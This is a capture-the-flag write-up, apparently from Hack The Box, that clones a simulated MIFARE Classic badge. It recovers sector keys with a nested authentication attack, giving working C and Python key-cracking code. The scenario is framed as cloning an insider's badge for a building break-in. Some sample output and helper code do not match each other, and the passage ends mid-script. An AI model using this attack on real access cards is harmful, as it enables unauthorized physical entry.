![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /><font size='10'>Cloned Clearance</font>

10<sup>th</sup> Apr 2026

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='orange'>Hard</font>

<br><br>

# Synopsis (!)

- Enumerate the simulated MIFARE Classic 1K card via the ISO 14443-A protocol to extract its UID and establish an active session.
- Exploit the CRYPTO1 stream cipher's weak PRNG using a Nested Authentication Attack to recover all 16 sector keys from a single known default key.
- Impersonate the cloned card to the door lock reader by dynamically handling mutual authentication challenges across all sectors to capture the flag.

## Description (!)

Our team has a physical op planned inside a secured building, but we only have a short window with an insider's door badge. We need you to extract everything off this MIFARE Classic card and clone it before it has to go back. The cloned badge will get us through the door when the team moves in.

## Skills Required (!)

- Understanding of the ISO 14443-A initialization and anticollision protocol.
- Knowledge of MIFARE Classic 1K memory layout and sector authentication.
- Familiarity with the CRYPTO1 stream cipher and its known vulnerabilities.
- Ability to compile and integrate C libraries (e.g., `crapto1`) with Python scripts.
- Proficiency with Python scripting and `pwntools` for TCP socket interaction.
- Understanding of cryptographic attacks, specifically the MIFARE Nested Authentication Attack.

# Solution (!)

The first step when approaching this challenge is to examine the provided `note.txt` file. This file outlines the challenge infrastructure and explains how we must communicate:

```text
| Service     | Port | Role         | Description                                    |
|-------------|------|--------------|------------------------------------------------|
| Card        | 1337 | You = Reader | Interact with Mifare Classic 1k card           |
| Reader      | 1338 | You = Card   | Impersonate the card to the door lock reader   |

Communication is via hex bytes separated by spaces over TCP. You must format your payloads exactly like this: `01 02 03 04`. There should be one command/response per line.

HINTS:
1. You only need Key A for each sector.
2. The distance of clock is around 1 to 10 between nonces.
```

From this file, we know there are two TCP endpoints we will interact with, representing a MIFARE Classic 1k Card and an NFC Reader door lock respectively. We also note that we will send arbitrary NFC payloads as space-separated hexadecimal strings.

Next, if we connect to the provided ports to observe their initial behavior:
- Connecting to one of the ports immediately outputs `26`. In the ISO/IEC 14443-A protocol, `26` is the `REQA` (Request Command Type A) initialization byte sent by a reader to find nearby cards. This confirms that this port acts as the **Reader**.
- Connecting to the other port produces no initial output. It is quietly waiting for a reader to initiate communication with `26`, confirming it acts as the **Card**.

### ISO 14443-A Initialization & Anticollision

Before we can interact with specific sectors of the MIFARE Classic card or attempt any cryptographic attacks, we must understand the ISO 14443-A protocol initialization. Here is the standard flow of commands required to bring the card into the active state, right up to the authentication phase:

1. **REQA / WUPA (`26` / `52`)**: The reader sends Request `26` or Wake-Up `52` to discover cards in the RF field.
2. **ATQA (Answer To Request)**: A card in the field responds with a 2-byte ATQA (e.g., `04 00`) indicating its type.
3. **Anticollision (`93 20`)**: The reader sends an anticollision command to ask for the card's Unique Identifier (UID).
4. **UID & BCC**: The card replies with its 4-byte UID and a 1-byte BCC checksum (e.g., `12 34 56 78 12`).
5. **Select Card (`93 70 ...`)**: The reader uses the discovered UID + BCC to explicitly select the card (`93 70 12 34 56 78 12 <CRC>`).
6. **SAK (Select Acknowledge)**: The card acknowledges the selection, typically with `08` (plus a CRC), indicating it's a MIFARE Classic 1k card and is now ready for sector authentication.

By acting as a reader and sending these bytes to the **Card** port (or acting as a card and validating/simulating these to the **Reader** port), we can progress the state machine to the `MFAuthent` phase (`60` or `61`), where the main challenge begins.

### Step 1: Card Enumeration & UID Extraction

Let's begin by connecting to the **Card** port. Following the ISO 14443-A protocol, our first step as a simulated reader is to send the `REQA` initialization byte.

**Send:**
```text
26
```

**Receive:**
```text
04 00
```

The card responds with `04 00`, which is its expected ATQA answer. This confirms the card is present and ready for anticollision.

Next, we send the anticollision command to extract the card's UID.

**Send:**
```text
93 20
```

**Receive:**
```text
13 37 40 07 63
```

The response gives us the unique identifier (UID) of the card. The first four bytes (`13 37 40 07`) represent the UID: `0x13374007`. The final byte (`63`) is the Block Check Character (BCC) checksum. We can mathematically verify this checksum because it is calculated by XORing the bytes of the UID together:
`0x13 ^ 0x37 ^ 0x40 ^ 0x07 = 0x63`

With the UID and checksum successfully obtained, the reader must now explicitly select this specific card to finish the initialization sequence. We do this by sending the Select Card command (`93 70`), followed by the acquired UID and checksum.

**Send:**
```text
93 70 13 37 40 07 63
```

**Receive:**
```text
08
```

The response byte `08` is the Select Acknowledge (SAK). In the context of MIFARE, `08` signifies that the card is a MIFARE Classic 1k and it has successfully been selected. The card is now active and ready for us to authenticate against its memory sectors!

### Step 2: Authentication & The Nonce Challenge

Once the card is actively selected, we can attempt to authenticate to a sector to read its blocks. MIFARE Classic dictates that we must authenticate to a block before we can read or write to it. Let's send the "Authenticate with Key A" command (`60`) for Block 0.

**Send:**
```text
60 00
```

**Receive:**
```text
B8 83 A7 D5
```
*(Note: Your received bytes here will vary depending on the card's PRNG!)*

This 4-byte response from the card is the **Nonce ($N_T$)**. It signifies the beginning of the MIFARE Classic challenge-response protocol:

1. **Card Challenge ($N_T$)**: The card generates a pseudo-random nonce and sends it to the reader in the clear.
2. **Reader Response ($N_R$, $a_R$)**: The reader generates its own nonce ($N_R$), explicitly calculates the reply to the card's challenge ($a_R$) using the shared sector key, and sends both encrypted to the card.
3. **Card Verification ($a_T$)**: The card verifies the reader's response and, if valid, replies with its own encrypted answer ($a_T$) to the reader's challenge.

Once this 3-way handshake is verified on both sides, an encrypted CRYPTO1 session is established.

### Step 3: Interacting with the Reader & The Proxy Fallacy

Now let's examine the **Reader** on the second port. Upon connecting, it immediately acts as the initiator by sending the `REQA` command (`26`). 

It's tempting to think we can simply map the input and output of the Card port directly to the Reader port to bypass the challenge. Let's look at what happens if we attempt to physically proxy the two together by opening simultaneous connections:

```text
# Terminal 1: Connect to the Card
$ nc 0 1337
26
04 00

# Terminal 2: Connect to the Reader to proxy traffic
$ nc 0 1338
BUSY - ONLY ONE CONNECTION ALLOWED ACROSS CARD AND READER
```

The challenge infrastructure actively prevents trivial relay attacks! A global lock ensures that if you are currently connected to the Card (`1337`), any simultaneous connection to the Reader (`1338`) will be immediately rejected with a `BUSY` message (and vice-versa).

### Step 4: Exploiting the Nested Attack

Now that we have identified the card as a MIFARE Classic 1k, we can formulate our attack plan. The MIFARE Classic relies on a proprietary stream cipher known as **CRYPTO1**. Over time, cryptographic researchers have discovered numerous severe vulnerabilities in this cipher, the most critical for this challenge being the **Nested Attack**.

**What is the Nested Attack?**
The Nested Attack exploits crippling weaknesses in the MIFARE Classic's Pseudo-Random Number Generator (PRNG). The PRNG is not truly random; it is highly predictable and timing-dependent. The attack flow works generally as follows:

1. **Prerequisite:** The attacker needs to know at least one valid key for *any* sector on the card (often a default factory key like `FF FF FF FF FF FF`).
2. **First Authentication:** The attacker uses the known key to authenticate to its respective sector. Once successful, an encrypted communication session is established.
3. **Nested Authentication:** While the encrypted session is still active, the attacker seamlessly attempts to authenticate to a *different* sector where the key is unknown.
4. **Nonce Leakage & Cryptanalysis:** The card responds with an encrypted nonce challenge for the new sector. Because the encryption leaks parity bits and the PRNG is predictable, the attacker can observe these encrypted nonces and accurately deduce the keystream. By gathering enough encrypted responses, the attacker can use offline cryptanalysis to fully recover the unknown key for the new sector.

Our goal will be to use a known default key to authenticate to a public sector, and then perform a nested authentication to recover the secret keys protecting the rest of the card!

### Step 5: Automating the Handshake

To interact with the simulation efficiently and execute our time-sensitive nested attack, we will need to build a reusable Python script. We can use the `pwntools` library to manage the TCP connection and process the hex I/O.

Let's start by scripting the ISO 14443-A initialization sequence, which we explored manually in Step 1. First, we import `pwntools` and establish a connection to the Card.

```python
#!/usr/bin/env python3
from pwn import *

# Set the target details for the Card Simulation
host = 'IP'
port = PORT

# 1. Establish the connection
io = remote(host, port)
```

Next, we create constant variables for our standard protocol commands and write a helper function `send_cmd()` to effortlessly format our payloads and process the responses.

```python
INIT        = b"26"
SELECT_L1   = b"93 20"
SELECT      = b"93 70"

def send_cmd(cmd, params=None):
    payload = cmd
    
    if params:
        if isinstance(params, list):
            params = " ".join(params)
        
        if isinstance(params, str):
            params = params.encode()
            
        payload += b" " + params
    
    io.sendline(payload)
    success(f"Sent: {payload.decode()}")
    
    return io.recvline().decode().strip()
```

With our helper ready, we can automate the actual handshake. We send the `INIT` command (`26`) and assert that we get `04 00` (ATQA) back. Then, we use the anti-collision command (`93 20`) to ask for the card's unique identifier.

```python
# 2. Wake up the card
resp = send_cmd(INIT)
assert resp == "04 00"

# 3. Request UID via Anticollision
card_uid_bcc = send_cmd(SELECT_L1)
log.info(f"Card UID + BCC: {card_uid_bcc}")
```

Finally, we parse out the 4-byte UID and the 1-byte BCC checksum from the response and provide them back to the card using the `SELECT` command (`93 70`) to officially open the session.

```python
# 4. Explicitly select the card
card_uid_bcc = card_uid_bcc.split()
card_uid = card_uid_bcc[:4]
card_bcc = card_uid_bcc[4]

resp = send_cmd(SELECT, card_uid_bcc)
print(resp)
assert resp == "08"
# Drop into interactive mode to verify
io.interactive()
```

Running this script connects to the card, automatically negotiates the UID, explicitly selects it, and then drops us into an interactive shell. From here, the card is in the active state and fully prepared for authentication requests!

### Step 6: Initiating the Authentication

With the card active, we need to authenticate to a sector to retrieve the initial pseudo-random plaintext nonce ($N_T$) challenge. We can add a new constant to our script for the `Authenticate with Key A` command (`60`).

```python
AUTH_KEY_A = b"60"
```

Next, we append a new command to explicitly authenticate to Block `00` (part of Sector 0). 

```python
# 5. Authenticate to Sector 0 (Block 0) to retrieve the first challenge nonce
nonce = send_cmd(AUTH_KEY_A, "00")
print(f"Nonce (N_T): {nonce}")

# Drop into interactive mode to verify
io.interactive()
```

When we run the updated script, it seamlessly progresses through the ISO 14443-A handshake and initiates the authentication challenge, yielding the 4-byte plaintext nonce from the card!

### Step 7: Working with CRYPTO1

Now that we have received the card's challenge nonce (e.g., `B8 83 A7 D5`), we must generate a valid encrypted reader response to complete the 3-pass authentication. This step requires performing cryptographic operations using the proprietary MIFARE Classic stream cipher, **CRYPTO1**.

Unfortunately, there is no known Python module to work with CRYPTO1. Therefore, we must rely on custom C implementations (like the `crapto1` library) and use them with our Python script.

For this challenge, we can download a robust C library for CRYPTO1 (like the widely used `crapto1` engine from the Proxmark3 or similar open-source projects) and write a small C helper binary to cleanly handle the math for us. 

Here is a simple C program we can compile to calculate the required encrypted Nonce ($N_R$) and Reader Answer ($a_R$) values.

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "./crapto1.h"

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <key_hex> <uid_hex> <nt_hex>\n", argv[0]);
        return 1;
    }

    // Parse inputs from hex strings
    uint64_t key = strtoull(argv[1], NULL, 16);
    uint32_t uid = strtoul(argv[2], NULL, 16);
    uint32_t nt  = strtoul(argv[3], NULL, 16);
    
    // 1. Initialize Crypto1 state with the key
    struct Crypto1State *s = crypto1_create(key);

    // 2. Feed the UID and the Tag Nonce (nt) into the state
    // This is the setup for the Three-Pass Authentication
    crypto1_word(s, uid ^ nt, 0); 

    // 3. Generate a Reader Nonce (nr) - can be anything, e.g., 0x12345678
    uint32_t nr = 0x12345678;
    
    uint32_t ks1 = crypto1_word(s, nr, 0);  // get keystream for nr
    uint32_t nr_enc = nr ^ ks1;             // encrypt nr

    uint32_t ar_expected = prng_successor(nt, 64);
    uint32_t ks2 = crypto1_word(s, ar_expected, 0);   // get ar keystream & feed AR in
    uint32_t ar_enc = ar_expected ^ ks2;    // encrypt ar

    // Print encrypted NR and AR in hex format for our Python script to read
    // This is the payload we send to the simulation
    printf("%08x %08x\n", nr_enc, ar_enc);

    crypto1_destroy(s);
    return 0;
}
```

Let's break this code down line by line to understand how it crafts the cryptographic payload:

1. **`uint64_t key = ...`, `uint32_t uid = ...`, `uint32_t nt = ...`**: First, we parse the 6-byte sector key, the 4-byte Card UID, and the 4-byte tag challenge nonce ($N_T$) command-line arguments into unsigned integers. 
2. **`crypto1_create(key)`**: We initialize our local CRYPTO1 cipher state using the provided known sector key.
3. **`crypto1_word(s, uid ^ nt, 0)`**: As per the MIFARE specification, the authentication handshake explicitly begins by feeding the bitwise XOR of the UID and the Card Nonce into the cipher state.
4. **`uint32_t nr = 0x12345678;`**: As the reader, we must generate our own 4-byte challenge nonce ($N_R$). Since we are dynamically generating it, we can statically set it to anything, like `0x12345678` for simplicity.
5. **`crypto1_word(s, nr, 0)` / `nr ^ ks1`**: We feed our Reader Nonce ($N_R$) into the cipher. The engine absorbs it into its internal state and outputs the corresponding stream cipher keystream (`ks1`). We XOR our chosen nonce with the keystream to obtain its encrypted byte representation (`nr_enc`).
6. **`prng_successor(nt, 64)`**: A crucial aspect of mutual authentication involves predicting the card's next expected state. The MIFARE pseudo-random number generator (PRNG) is simply a predictable Linear Feedback Shift Register (LFSR). We step the LFSR forward exactly 64 times from the initial card nonce to determine the **expected answer** ($a_R$).
7. **`crypto1_word(s, ar_expected, 0)` / `ar_expected ^ ks2`**: We feed this expected answer into the cipher to retrieve the next chunk of keystream (`ks2`), and immediately encrypt the expected answer by XORing them together to get `ar_enc`.
8. **`printf("%08x %08x\n", nr_enc, ar_enc);`**: Finally, we output the encrypted Reader Nonce and the encrypted Answer. This resulting 8-byte hex string ($N_R$, $a_R$) represents the precise, encrypted challenge-response payload we must return to the card over the TCP socket!

### Step 8: Finishing the Handshake

Now that we have our custom C cryptographic calculator, we can compile it:

```bash
gcc -o compute_nr_ar main.c crapto1.c crypto1.c
```
*(Note: You will need the appropriate `crapto1.c/h` files in your directory for this to compile).*

With our binary ready, let's go back to our Python script and integrate it. We'll write a short wrapper using Python's `subprocess` module to call our newly compiled C binary and fetch the calculated response, plus a helper to format our output.

```python
import subprocess

def compute_nr_ar(uid_hex, nt_hex, key_hex="FFFFFFFFFFFF"):
    """Calls our C binary to calculate the encrypted Reader Response."""
    result = subprocess.check_output(
        ["./crapto/compute_nr_ar", key_hex, uid_hex, nt_hex]
    ).decode().strip()
    
    nr_hex, ar_hex = result.split()
    return nr_hex, ar_hex

def format_to_spaces(hex_var):
    return ' '.join(hex_var[i:i+2] for i in range(0, len(hex_var), 2))
```

Now we have everything we need to complete the handshake! Assuming we are targeting a public sector that uses the standard MIFARE default factory key (`FF FF FF FF FF FF`), we can feed our intercepted nonce to our solver. 

Because the port expects the data to be formatted with spaces between each byte (e.g., `01 02 03`), we'll need to clean up our variables before execution and then format the C binary's output accordingly using our new helper.

```python
# 6. Prepare the variables for the C solver
# The simulator treats all fields as big-endian blocks,
# so we should NOT reverse the byte strings before feeding them to crapto1!
nt = ''.join(nonce.split())
print(f"nt: {nt}")
uid = ''.join(card_uid)
print(f"uid: {uid}")

# Calculate the optimal encrypted payload
nr, ar = compute_nr_ar(uid, nt)
payload = format_to_spaces(nr) + " " + format_to_spaces(ar)
log.info(payload)

# 7. Send the response back to the card to finish mutual authentication!
card_answer = send_cmd(payload.encode())

log.success(f"Card Response (Encrypted a_T): {card_answer}")
io.interactive()
```

If we execute this updated script, we successfully authenticate to Sector 0! Instead of a NACK or an error, the execution drops us into interactive mode where we immediately receive a 4-byte response from the card representing its encrypted answer ($a_T$).

```text
[+] Sent: 26
[+] Sent: 93 20
[*] Card UID: 04 00
[+] Sent: 93 70 13 37 40 07 63
08
[+] Sent: 60 00
38 95 81 A6
nt: 389581A6
uid: 13374007
[*] fe 84 31 d8 7f 1e 37 fa
[+] Sent: fe 84 31 d8 7f 1e 37 fa
[+] Card Response (Encrypted a_T): 9D 0F 50 41
```

At this point, we have established a fully authenticated, encrypted CRYPTO1 session for Sector 0.

### Step 9: The Nested Authentication Attack — Theory & Key Recovery

With an active, encrypted session established for Sector 0 using the known default key (`FF FF FF FF FF FF`), we now possess the single foothold we need to compromise every other sector on the card. The attack that makes this possible is the **MIFARE Classic Nested Authentication Attack**.

#### The Core Vulnerability

The critical flaw in MIFARE Classic is deceptively simple: **the card allows us to issue a new authentication command for a different sector while we are still inside an existing encrypted session**. When we authenticate to Sector 0, the card and reader establish a shared CRYPTO1 keystream. If we now send an `Authenticate with Key A` command targeting, say, Sector 1 (`60 07`), the card generates a fresh 4-byte challenge nonce ($N_{T2}$) for the new sector — but it transmits this nonce **encrypted under the active Sector 0 keystream**.

This is the key insight: the card is effectively encrypting data related to an *unknown* key (Sector 1's) using a keystream derived from a *known* key (Sector 0's). Because we know everything about the Sector 0 session — the key, the UID, the original nonce — we can reconstruct the exact keystream the card used to encrypt $N_{T2}$. With that keystream in hand, we can XOR it away to recover the plaintext $N_{T2}$.

But **we don't even need the plaintext nonce itself**. What we actually exploit is something deeper: the relationship between the encrypted nonce and the CRYPTO1 cipher's internal state.

#### From Keystream to Key Candidates

Here is how the math works:

1. **The card's PRNG is a 16-bit LFSR** — When the card generates a new nonce for the nested authentication, that nonce is the current state of its predictable PRNG. From our *first* authentication (where we received the plaintext $N_{T1}$), we know the PRNG's starting state. By stepping it forward a small number of clock cycles (typically 1–10 in a simulation), we can predict what $N_{T2}$ should be: $N_{T2} = \text{prng\_successor}(N_{T1}, d)$ for some small distance $d$.

2. **Recovering 32 bits of keystream** — The encrypted nonce we receive is $\text{enc}(N_{T2}) = N_{T2} \oplus KS$, where $KS$ is the 32-bit keystream chunk produced by the target sector's CRYPTO1 state. Since we can predict $N_{T2}$, we compute: $KS = N_{T2} \oplus \text{enc}(N_{T2})$.

3. **`lfsr_recovery32` narrows the search** — The CRYPTO1 cipher uses a 48-bit LFSR. Knowing 32 bits of keystream output constrains the internal state significantly: from $2^{48}$ possible keys down to approximately $2^{16}$ (~65,000) candidates. The `crapto1` library's `lfsr_recovery32()` function efficiently enumerates all LFSR states consistent with those 32 known keystream bits.

4. **Rolling back to the key** — Each candidate state represents the LFSR at the point *after* it produced the keystream. To recover the original 48-bit key, we "roll back" the cipher's state: first undoing the 32 keystream bits, then undoing the initialization step where $(UID \oplus N_{T2})$ was fed in. The resulting LFSR state *is* the raw key.

#### Why Two Nonces?

A single nested nonce yields ~65,000 candidate keys — too many to try one by one against the card without getting locked out or taking too long. The elegant solution is to **collect two nested nonces from two separate sessions** and intersect the candidate sets. Since each nonce independently constrains the key space, the intersection almost always yields exactly **one key** — the correct one.

#### The C Cracker: `crack_nested.c`

With the theory understood, let's look at our C implementation that performs the actual key recovery. This program takes two nonce pairs as input, recovers candidates from each, and intersects them:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "./crapto1.h"

// Comparison function for qsort/bsearch on uint64_t
static int cmp_u64(const void *a, const void *b) {
    uint64_t va = *(const uint64_t *)a;
    uint64_t vb = *(const uint64_t *)b;
    if (va < vb) return -1;
    if (va > vb) return  1;
    return 0;
}

// Recover all candidate keys for one nonce pair.
// Returns malloc'd array of keys, sets *count.
static uint64_t *recover_candidates(uint32_t uid, uint32_t nt1,
                                     uint32_t enc_nt2, int *count) {
    uint64_t *keys = NULL;
    int capacity = 0;
    *count = 0;

    // Try PRNG distances 1..10
    for (int dist = 1; dist <= 10; dist++) {
        uint32_t nt2 = prng_successor(nt1, dist);
        uint32_t ks2 = nt2 ^ enc_nt2;

        struct Crypto1State *candidates = lfsr_recovery32(ks2, 0);
        if (!candidates) continue;

        for (struct Crypto1State *sl = candidates; sl->odd || sl->even; ++sl) {
            struct Crypto1State test = *sl;

            // Roll back: 32 bits keystream (input=0) + 32 bits init (uid^nt2)
            lfsr_rollback_word(&test, 0, 0);
            lfsr_rollback_word(&test, uid ^ nt2, 0);

            uint64_t key = 0;
            crypto1_get_lfsr(&test, &key);

            // Grow array if needed
            if (*count >= capacity) {
                capacity = capacity ? capacity * 2 : 65536;
                keys = realloc(keys, capacity * sizeof(uint64_t));
            }
            keys[(*count)++] = key;
        }
        free(candidates);
    }

    // Sort for intersection
    if (keys && *count > 0)
        qsort(keys, *count, sizeof(uint64_t), cmp_u64);

    return keys;
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        fprintf(stderr, "Usage: %s <uid> <nt1_a> <enc_nt2_a> <par_a> "
                        "<nt1_b> <enc_nt2_b> <par_b>\n", argv[0]);
        return 1;
    }

    uint32_t uid       = strtoul(argv[1], NULL, 16);
    uint32_t nt1_a     = strtoul(argv[2], NULL, 16);
    uint32_t enc_nt2_a = strtoul(argv[3], NULL, 16);
    uint32_t nt1_b     = strtoul(argv[5], NULL, 16);
    uint32_t enc_nt2_b = strtoul(argv[6], NULL, 16);

    fprintf(stderr, "[*] Recovering candidates from nonce A...\n");
    int count_a = 0;
    uint64_t *keys_a = recover_candidates(uid, nt1_a, enc_nt2_a, &count_a);
    fprintf(stderr, "    -> %d candidates\n", count_a);

    fprintf(stderr, "[*] Recovering candidates from nonce B...\n");
    int count_b = 0;
    uint64_t *keys_b = recover_candidates(uid, nt1_b, enc_nt2_b, &count_b);
    fprintf(stderr, "    -> %d candidates\n", count_b);

    // Intersect: for each key in A, binary search in B
    fprintf(stderr, "[*] Intersecting...\n");
    int found = 0;
    for (int i = 0; i < count_a; i++) {
        if (bsearch(&keys_a[i], keys_b, count_b, sizeof(uint64_t), cmp_u64)) {
            printf("%012lx\n", keys_a[i]);
            found++;
        }
    }

    fprintf(stderr, "[+] Found %d key(s)\n", found);

    free(keys_a);
    free(keys_b);
    return found > 0 ? 0 : 1;
}
```

Let's break this down into its key components:

**`recover_candidates()` — The Core Recovery Function**

1. **Trying PRNG distances 1–10**: Since the card's PRNG is a simple LFSR, the nonce $N_{T2}$ is just $N_{T1}$ stepped forward by some small distance $d$. In a simulation (where no real RF timing jitter exists), the distance is deterministic and small. We brute-force distances 1 through 10 to cover all possibilities.

2. **`prng_successor(nt1, dist)`**: This function steps the PRNG forward `dist` cycles from $N_{T1}$ to predict $N_{T2}$.

3. **`nt2 ^ enc_nt2`** = `ks2`: This is the critical XOR. The encrypted nonce we captured is $N_{T2} \oplus KS$. Since we just predicted $N_{T2}$, XORing gives us the raw 32-bit keystream chunk that the *unknown* key's cipher produced.

4. **`lfsr_recovery32(ks2, 0)`**: The `crapto1` library's workhorse. Given 32 bits of known keystream output, it returns an array of every possible CRYPTO1 internal state (each defined by its `odd` and `even` halves) that could have produced that keystream. This is the mathematical core of the attack — exploiting the algebraic structure of the 48-bit LFSR to enumerate solutions efficiently.

5. **Rolling back the state**: Each candidate state is where the cipher was *after* producing the keystream. To find the actual key, we must reverse the cipher's evolution:
   - `lfsr_rollback_word(&test, 0, 0)` — Undo the 32 bits of keystream generation.
   - `lfsr_rollback_word(&test, uid ^ nt2, 0)` — Undo the initialization step where $(UID \oplus N_{T2})$ was fed into the cipher.

6. **`crypto1_get_lfsr(&test, &key)`**: After rolling back, the LFSR state corresponds directly to the 48-bit sector key. This function extracts it.

**`main()` — Two-Nonce Intersection**

The main function is straightforward: it runs `recover_candidates()` twice (once per nonce pair), sorts each candidate array, then performs an **intersection** via binary search. For each key in set A, it checks if that same key appears in set B. Only keys present in *both* sets are printed — and in practice, this yields exactly one result: the correct key!

#### The Python Orchestrator: `crack_sector_key.py`

Now we need a script to automate the entire process: connect to the card, perform the ISO 14443-A handshake, authenticate to Sector 0, trigger the nested authentication for a target sector, and hand the collected data to our C cracker. Here is `crack_sector_key.py`:

```python
#!/usr/bin/env python3
from pwn import *
import subprocess
import sys

host = 'localhost'
port = 1337

INIT        = b"26"
SELECT_L1   = b"93 20"
SELECT      = b"93 70"
AUTH_KEY_A  = b"60"


def send_cmd(io, cmd, params=None):
    payload = cmd
    if params:
        if isinstance(params, list):
            params = " ".join(params)
        if isinstance(params, str):
            params = params.encode()
        payload += b" " + params
    io.sendline(payload)
    return io.recvline().decode().strip()


def compute_nr_ar(uid_hex, nt_hex, key_hex="FFFFFFFFFFFF"):
    result = subprocess.check_output(
        ["./crapto/compute_nr_ar", key_hex, uid_hex, nt_hex]
    ).decode().strip()
    nr_hex, ar_hex = result.split()
    return nr_hex, ar_hex


def crack_nested_key(uid_hex, nt1_a, enc_nt2_a, par_a, nt1_b, enc_nt2_b, par_b):
    """Run crack_nested with two nonce pairs, return recovered key(s)."""
    result = subprocess.check_output(
        ["./crapto/crack_nested", uid_hex,
         nt1_a, enc_nt2_a, par_a,
         nt1_b, enc_nt2_b, par_b],
        stderr=subprocess.PIPE
    )
    keys = [line.strip() for line in result.decode().strip().split('\n') if line.strip()]
    return keys


def format_to_spaces(hex_var):
    return ' '.join(hex_var[i:i+2] for i in range(0, len(hex_var), 2))


def sector_to_trailer_block(sector_id):
    """Convert sector ID to its trailer block address: sector * 4 + 3."""
    return sector_id * 4 + 3
```

These are the same building blocks we used before (`send_cmd`, `compute_nr_ar`, `format_to_spaces`), alongside two new helpers:

- **`crack_nested_key()`** — Calls our compiled `crack_nested` C binary with two nonce pairs and returns the recovered key(s).
- **`sector_to_trailer_block()`** — Converts a sector number to its trailer block address. In MIFARE Classic 1K, each sector spans 4 blocks, so Sector $n$'s authentication block is at address $4n + 3$.

Next, the function that performs a single nested nonce collection:

```python
def collect_nested_nonce(uid_hex, card_uid_bcc, sector_id):
    """
    Connect to card, auth sector 0, request nested auth for given sector.
    Returns (nt1_hex, enc_nt2_hex, par_hex).
    """
    io = remote(host, port)

    # Handshake
    resp = send_cmd(io, INIT)
    assert resp == "04 00", f"REQA failed: {resp}"
    resp = send_cmd(io, SELECT_L1)
    resp = send_cmd(io, SELECT, card_uid_bcc)
    assert resp == "08", f"SELECT failed: {resp}"

    # Auth sector 0 (block 0x00)
    nonce = send_cmd(io, AUTH_KEY_A, "00")
    nt = ''.join(nonce.split())
    log.info(f"NT1: {nt}")

    # Complete auth with default key
    nr, ar = compute_nr_ar(uid_hex, nt)
    payload = format_to_spaces(nr) + " " + format_to_spaces(ar)
    card_answer = send_cmd(io, payload.encode())
    log.info(f"Auth sector 0 response: {card_answer}")

    # Nested auth for target sector
    block_addr = sector_to_trailer_block(sector_id)
    log.info(f"Requesting nested auth for sector {sector_id} (block 0x{block_addr:02X})")
    nested_resp = send_cmd(io, AUTH_KEY_A, f"{block_addr:02X}")
    parts = nested_resp.split()
    assert len(parts) == 5, f"Expected 5 parts (4 enc_nt + 1 par), got: {nested_resp}"

    enc_nt2 = ''.join(parts[:4])
    par = parts[4]
    log.info(f"Encrypted nested nonce: {enc_nt2}, Parity: {par}")

    io.close()
    return nt, enc_nt2, par
```

This function encapsulates the complete lifecycle of a single nested nonce capture:

1. **Opens a fresh connection** to the card and runs the full ISO 14443-A handshake (REQA → Anticollision → SELECT).
2. **Authenticates to Sector 0** using the known default key, exactly as we did manually in Steps 6–8.
3. **Triggers a nested authentication** by sending `AUTH_KEY_A` for the target sector's trailer block. The card responds with 5 space-separated hex bytes: the first 4 are the encrypted nonce ($\text{enc}(N_{T2})$), and the 5th byte contains the encrypted **parity bits**.
4. Returns the plaintext $N_{T1}$ (from the Sector 0 auth), the encrypted $N_{T2}$, and the parity byte.

We call this function **twice** to collect two independent nonce pairs — the requirement for our intersection-based key recovery.

Finally, the `main()` function ties everything together:

```python
def main():
    target_sector = int(sys.argv[1])

    # Step 1: Get card UID
    io = remote(host, port)
    send_cmd(io, INIT)
    card_uid_bcc_str = send_cmd(io, SELECT_L1)
    io.close()

    card_uid_bcc_parts = card_uid_bcc_str.split()
    uid_hex = ''.join(card_uid_bcc_parts[:4])
    log.success(f"Card UID: {uid_hex}")

    # Step 2: Collect two nested nonces
    nt1_a, enc_nt2_a, par_a = collect_nested_nonce(uid_hex, card_uid_bcc_parts, target_sector)
    nt1_b, enc_nt2_b, par_b = collect_nested_nonce(uid_hex, card_uid_bcc_parts, target_sector)

    # Step 3: Crack the key by intersecting candidates
    recovered_keys = crack_nested_key(
        uid_hex,
        nt1_a, enc_nt2_a, par_a,
        nt1_b, enc_nt2_b, par_b
    )

    for key in recovered_keys:
        log.success(f"Recovered Sector {target_sector} Key: {key}")
```

The orchestration is clean:
1. **Grab the UID** from a quick throwaway connection.
2. **Collect nonce A** — a full connect → auth Sector 0 → nested auth cycle.
3. **Collect nonce B** — an identical cycle, producing a second independent nonce pair.
4. **Invoke `crack_nested`** with both pairs. The C binary recovers ~65k candidates from each, intersects them, and prints the unique key.

We can compile the C cracker and run the full pipeline:

```bash
gcc -O2 -o crapto/crack_nested crapto/crack_nested.c crapto/crapto1.c crapto/crypto1.c
python3 crack_sector_key.py 1
```

```text
[+] Card UID: 13374007
[*] NT1: 389581A6
[*] Auth sector 0 response: 9D 0F 50 41
[*] Requesting nested auth for sector 1 (block 0x07)
[*] Encrypted nested nonce: 1A2B3C4D, Parity: 0E
[*] NT1: A72F44B1
[*] Auth sector 0 response: 3E 7C 12 89
[*] Requesting nested auth for sector 1 (block 0x07)
[*] Encrypted nested nonce: 5C6D7E8F, Parity: 3A
[*] Recovering candidates from nonce A...
    -> 42391 candidates
[*] Recovering candidates from nonce B...
    -> 39847 candidates
[*] Intersecting...
[+] Found 1 key(s)
[+] Recovered Sector 1 Key: a0b1c2d3e4f5
```

With a single command, we've recovered the secret key for Sector 1. This same process can be repeated for all 16 sectors on the card to extract every key!

### Step 10: Cracking All Sector Keys

Now that we can recover a single sector's key, we need to scale this up to crack all 16 sectors on the card. The Reader port will require us to authenticate to multiple sectors, so we must recover every key before we can impersonate the card.

We wrap our `crack_sector_key.py` invocation in a loop and build a key database. Here's the key recovery portion of our final `solver.py`:

```python
#!/usr/bin/env python3

import subprocess
import re
import sys
import argparse
from pwn import *

KEYS = {
    "0": "FFFFFFFFFFFF",
}

def grab_key(sector_id, card_port, ip):
    print(f"Cracking sector {sector_id}...")
    proc = subprocess.Popen(
        ["python3", "crack_sector_key.py", str(sector_id), str(card_port), ip],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    recovered_key = None
    key_pattern = re.compile(fr"Done! Sector {sector_id} key = ([0-9a-fA-F]+)")
    
    for line in iter(proc.stdout.readline, ''):
        sys.stdout.write(line)
        sys.stdout.flush()
        if recovered_key is None:
